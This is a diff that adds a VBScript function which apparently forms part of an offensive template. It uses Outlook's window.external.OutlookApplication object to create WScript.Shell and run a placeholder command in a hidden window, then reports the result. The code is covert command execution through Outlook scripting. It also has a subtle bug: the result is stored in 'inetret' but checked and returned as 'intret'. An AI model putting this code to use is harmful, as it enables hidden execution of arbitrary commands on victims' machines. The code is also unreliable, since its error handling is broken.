@@ -1,0 +1,11 @@
+Function Execute_WscriptShell()
+	On Error Resume Next
+	Const HIDDEN_WINDOW = 0
+	Set ws = window.external.OutlookApplication.CreateObject("Wscript.shell")
+		
+	inetret = ws.Run({{command}}, 0, false)
+	If intret <> 0 Then 
+		Execute_WscriptShell = "Error running program"
+	End If
+	Execute_WscriptShell = "Command Executed: " & {{command}} & vbCrLf & intret
+End Function
